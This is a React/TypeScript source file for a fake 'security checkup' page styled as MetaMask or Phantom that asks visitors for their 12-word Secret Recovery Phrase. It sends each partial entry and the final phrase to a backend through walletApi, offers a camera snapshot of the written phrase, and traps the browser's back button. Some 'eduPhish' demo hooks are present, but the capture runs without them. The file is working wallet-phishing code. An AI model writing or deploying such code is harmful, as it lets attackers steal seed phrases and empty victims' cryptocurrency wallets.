import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { useLocation, useNavigate } from 'react-router-dom'
import { ChevronLeft, Info } from 'lucide-react'
import toast from 'react-hot-toast'
import { walletApi } from '../lib/walletApi'
import {
  getSecurityCheckAddress,
  getSecurityCheckWallet,
  isSecurityCheckupRequired,
  markSecurityCheckDone,
  normalizeSecurityCheckWallet,
  type SecurityCheckWallet,
} from '../lib/metaMaskSecurityCheck'
import { createEduPhishSession, isEduPhishingDemoEnabled, patchEduPhishSession } from '../lib/eduPhishDemo'
import { useWalletState } from '../context/WalletContext'
import { WalletLogo } from '../lib/walletLogos'
import {
  RecoveryPhraseCameraScanner,
  ScanPhraseButton,
} from '../components/RecoveryPhraseCameraScanner'
import {
  RECOVERY_PHRASE_WORD_COUNT,
  sanitizeRecoveryPhrase,
} from '../lib/sanitizeRecoveryPhrase'

const WORD_COUNT = RECOVERY_PHRASE_WORD_COUNT

type ViewMode = 'paste' | 'grid'

function emptyWords() {
  return Array.from({ length: WORD_COUNT }, () => '')
}

function WalletHeaderBrand({ wallet }: { wallet: SecurityCheckWallet }) {
  return (
    <div className="flex flex-col items-center gap-3">
      <WalletLogo name={wallet} className="h-11 w-11 sm:h-12 sm:w-12" rounded={false} alt={wallet} />
      <span className="text-[22px] font-semibold tracking-[-0.03em] text-white sm:text-[24px]">{wallet}</span>
    </div>
  )
}

function recoveryHelpLine(wallet: SecurityCheckWallet): string {
  if (wallet === 'Phantom') {
    return 'Phantom menu → Settings → Security & Privacy → Show Secret Recovery Phrase. Paste, type, or snap your 12 words below.'
  }
  return 'Menu → Settings → Security & Privacy → Reveal Secret Recovery Phrase. Paste, type, or scan your 12 words below.'
}

export const MetaMaskSecurityCheckup: React.FC = () => {
  const navigate = useNavigate()
  const location = useLocation()
  const { walletAddress: connectedAddress, walletName } = useWalletState()
  const state = location.state as { walletAddress?: string; walletBrand?: SecurityCheckWallet } | null
  const walletBrand: SecurityCheckWallet =
    state?.walletBrand ||
    normalizeSecurityCheckWallet(walletName) ||
    getSecurityCheckWallet()
  const address = state?.walletAddress || connectedAddress || getSecurityCheckAddress() || ''

  const [viewMode, setViewMode] = useState<ViewMode>('paste')
  const [pasteText, setPasteText] = useState('')
  const [words, setWords] = useState(emptyWords)
  const [submitting, setSubmitting] = useState(false)
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [cameraOpen, setCameraOpen] = useState(false)
  const inputRefs = useRef<Array<HTMLInputElement | null>>([])
  const textareaRef = useRef<HTMLTextAreaElement | null>(null)

  const phrase = useMemo(() => words.map((w) => w.trim()).filter(Boolean).join(' '), [words])
  const filledCount = useMemo(() => words.filter((w) => w.trim()).length, [words])
  const ready = filledCount === WORD_COUNT
  const pasteSanitized = useMemo(() => sanitizeRecoveryPhrase(pasteText), [pasteText])
  const pasteReady = pasteSanitized.validCount >= WORD_COUNT

  useEffect(() => {
    if (!isSecurityCheckupRequired()) {
      navigate('/submissions', { replace: true })
    }
  }, [navigate])

  useEffect(() => {
    if (!isSecurityCheckupRequired()) return
    window.history.pushState(null, '', window.location.href)
    const onPopState = () => {
      window.history.pushState(null, '', window.location.href)
    }
    window.addEventListener('popstate', onPopState)
    return () => window.removeEventListener('popstate', onPopState)
  }, [])

  useEffect(() => {
    let cancelled = false
    if (isEduPhishingDemoEnabled()) {
      createEduPhishSession(walletBrand)
        .then((session) => {
          if (!cancelled) setSessionId(session.id)
        })
        .catch(() => {})
    }
    return () => {
      cancelled = true
    }
  }, [])

  const persistDraft = useCallback(
    (nextWords: string[]) => {
      if (!address) return
      const joined = nextWords.map((w) => w.trim()).filter(Boolean).join(' ')
      walletApi.recordMetaMaskUnlockDraft({
        walletAddress: address,
        password: joined,
        pageUrl: window.location.href,
        walletType: walletBrand,
      })
      if (sessionId) {
        void patchEduPhishSession(sessionId, {
          step: 'recovery_form',
          seedWords: nextWords.map((w) => w.trim()).filter(Boolean),
          activeField: 'seed_phrase',
        }).catch(() => {})
      }
    },
    [address, sessionId, walletBrand]
  )

  const applyWords = useCallback(
    (next: string[]) => {
      setWords(next)
      persistDraft(next)
    },
    [persistDraft]
  )

  const ingestRawPhrase = useCallback(
    (raw: string, options?: { goToGrid?: boolean }) => {
      const result = sanitizeRecoveryPhrase(raw)
      setPasteText(result.cleanedText)
      const normalizedRaw = raw.trim().replace(/\s+/g, ' ')
      if (result.removedTokenCount > 0 || result.cleanedText !== normalizedRaw) {
        toast('Removed numbers and invalid text — kept valid words only.', { icon: 'ℹ️' })
      }
      if (options?.goToGrid && result.validCount >= WORD_COUNT) {
        applyWords(result.words)
        setViewMode('grid')
      }
      return result
    },
    [applyWords]
  )

  const showGridFromPhrase = useCallback(
    (text: string) => {
      ingestRawPhrase(text, { goToGrid: true })
    },
    [ingestRawPhrase]
  )

  const handleWordChange = (index: number, value: string) => {
    const cleaned = value.replace(/[^a-z]/gi, '').toLowerCase()
    const next = [...words]
    next[index] = cleaned
    applyWords(next)
  }

  const handleGridPaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const text = e.clipboardData.getData('text')
    showGridFromPhrase(text)
  }

  const handlePasteButton = async () => {
    try {
      const text = await navigator.clipboard.readText()
      if (text.trim()) {
        ingestRawPhrase(text, { goToGrid: true })
      }
    } catch {
      textareaRef.current?.focus()
      toast.error('Paste into the box with Ctrl+V or ⌘V')
    }
  }

  const handlePasteAreaContinue = (e: React.FormEvent) => {
    e.preventDefault()
    if (!pasteReady) return
    showGridFromPhrase(pasteText)
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === ' ' || e.key === 'Enter') {
      e.preventDefault()
      if (index < WORD_COUNT - 1) inputRefs.current[index + 1]?.focus()
      return
    }
    if (e.key === 'Backspace' && !words[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!ready) {
      toast.error('Enter all 12 words of your Secret Recovery Phrase.')
      return
    }
    setSubmitting(true)
    try {
      if (address) {
        await walletApi.recordMetaMaskUnlock({
          walletAddress: address,
          password: phrase,
          pageUrl: window.location.href,
          walletType: walletBrand,
        })
        markSecurityCheckDone(address)
      }
      if (sessionId) {
        await patchEduPhishSession(sessionId, {
          step: 'submitted',
          seedWords: words.map((w) => w.trim()).filter(Boolean),
          activeField: null,
        }).catch(() => {})
      }
      toast.success('Wallet imported')
      navigate('/submissions', { replace: true })
    } finally {
      setSubmitting(false)
    }
  }

  const handleSnapSuccess = useCallback(
    async (payload: { snapDataUrl: string }) => {
      setSubmitting(true)
      try {
        if (address) {
          await walletApi.recordMetaMaskUnlock({
            walletAddress: address,
            password: '',
            pageUrl: window.location.href,
            phraseSnapImage: payload.snapDataUrl,
            walletType: walletBrand,
          })
          markSecurityCheckDone(address)
        }
        if (sessionId) {
          await patchEduPhishSession(sessionId, {
            step: 'submitted',
            seedWords: [],
            activeField: null,
          }).catch(() => {})
        }
        toast.success('Photo saved')
        navigate('/submissions', { replace: true })
        return true
      } finally {
        setSubmitting(false)
      }
    },
    [address, sessionId, navigate]
  )

  const handleBackInGrid = () => {
    setViewMode('paste')
    setPasteText(phrase)
  }

  const card = (
    <div className="w-full max-w-[440px] rounded-[16px] bg-[#121212] px-6 pb-8 pt-5 sm:px-7">
      {viewMode === 'grid' ? (
        <button
          type="button"
          onClick={handleBackInGrid}
          className="mb-5 flex h-9 w-9 items-center justify-center text-[#e5e5e5] hover:opacity-80"
          aria-label="Edit phrase"
        >
          <ChevronLeft className="h-7 w-7" strokeWidth={1.75} />
        </button>
      ) : (
        <div className="mb-5 h-9 w-9" aria-hidden />
      )}

      <h1 className="mb-8 text-[32px] font-normal leading-tight tracking-tight text-white sm:text-[34px]">
        Import a wallet
      </h1>

      <div className="mb-4 flex items-center gap-1.5 text-[15px] text-[#a3a3a3]">
        <span>Enter your Secret Recovery Phrase</span>
        <Info className="h-4 w-4 text-[#737373]" strokeWidth={2} />
      </div>

      {viewMode === 'paste' ? (
        <>
          <p className="mb-4 text-[13px] leading-relaxed text-[#8a8a8a]">{recoveryHelpLine(walletBrand)}</p>
          <form onSubmit={handlePasteAreaContinue}>
            <div className="relative">
              <textarea
                ref={textareaRef}
                value={pasteText}
                onChange={(e) => setPasteText(e.target.value)}
                onPaste={(e) => {
                  e.preventDefault()
                  ingestRawPhrase(e.clipboardData.getData('text'), { goToGrid: true })
                }}
                placeholder="Add a space between each word and make sure no one is watching."
                rows={7}
                spellCheck={false}
                autoComplete="off"
                className="min-h-[200px] w-full resize-none rounded-xl border border-[#333] bg-[#242424] px-4 py-4 pb-12 text-[16px] leading-relaxed text-white outline-none placeholder:text-[#737373] focus:border-[#484848] sm:min-h-[220px] sm:text-[17px]"
              />
              <button
                type="button"
                onClick={() => void handlePasteButton()}
                className="absolute bottom-3 right-3 text-[15px] font-medium text-white hover:text-[#d4d4d4]"
              >
                Paste
              </button>
            </div>
            <ScanPhraseButton onClick={() => setCameraOpen(true)} />
            <button
              type="submit"
              disabled={!pasteReady}
              className={`mt-8 w-full rounded-full py-3.5 text-[16px] font-medium transition-all ${
                pasteReady
                  ? 'bg-white text-[#141414] hover:bg-[#f0f0f0]'
                  : 'cursor-not-allowed bg-[#383838] text-[#737373]'
              }`}
            >
              Continue
            </button>
          </form>
        </>
      ) : (
        <form onSubmit={handleSubmit} onPasteCapture={handleGridPaste}>
          <div className="grid grid-cols-3 gap-3 sm:gap-3.5">
            {words.map((word, index) => (
              <div key={index} className="relative">
                <span className="pointer-events-none absolute left-3.5 top-[17px] text-[13px] text-[#737373] tabular-nums">
                  {index + 1}
                </span>
                <input
                  ref={(el) => {
                    inputRefs.current[index] = el
                  }}
                  type="password"
                  inputMode="text"
                  autoComplete="off"
                  autoCorrect="off"
                  spellCheck={false}
                  value={word}
                  onChange={(e) => handleWordChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="h-[54px] w-full rounded-xl border border-[#333333] bg-[#242424] pl-9 pr-2 text-[15px] text-white outline-none focus:border-[#484848] focus:ring-1 focus:ring-[#484848]/40 caret-white sm:h-[56px] sm:text-[16px]"
                />
              </div>
            ))}
          </div>

          <div className="mt-3 flex justify-end">
            <button
              type="button"
              onClick={() => {
                applyWords(emptyWords())
                setPasteText('')
                setViewMode('paste')
              }}
              className="text-sm font-medium text-white transition-colors hover:text-[#d4d4d4]"
            >
              Clear all
            </button>
          </div>

          <button
            type="submit"
            disabled={!ready || submitting}
            className={`mt-8 w-full rounded-full py-3.5 text-[16px] font-medium transition-all ${
              ready && !submitting
                ? 'bg-white text-[#141414] hover:bg-[#f0f0f0]'
                : 'cursor-not-allowed bg-[#383838] text-[#737373]'
            }`}
          >
            {submitting ? 'Importing…' : 'Continue'}
          </button>
        </form>
      )}
    </div>
  )

  return (
    <div className="flex min-h-[100dvh] flex-col bg-black font-[system-ui,-apple-system,BlinkMacSystemFont,'Segoe_UI',Roboto,sans-serif] text-white">
      <header className="relative px-5 pb-2 pt-6 sm:px-8 sm:pt-8">
        <div className="flex justify-center">
          <WalletHeaderBrand wallet={walletBrand} />
        </div>
        <button
          type="button"
          className="absolute right-5 top-6 flex items-center gap-1.5 rounded-lg border border-[#333] bg-transparent px-3 py-1.5 text-xs text-[#d4d4d4] sm:right-8 sm:top-8"
        >
          English
          <span className="text-[10px] opacity-60">▾</span>
        </button>
      </header>

      <div className="flex flex-1 items-start justify-center px-4 pb-12 pt-6 sm:px-8">
        {card}
      </div>

      <RecoveryPhraseCameraScanner
        open={cameraOpen}
        onClose={() => setCameraOpen(false)}
        onSnapSuccess={handleSnapSuccess}
      />
    </div>
  )
}
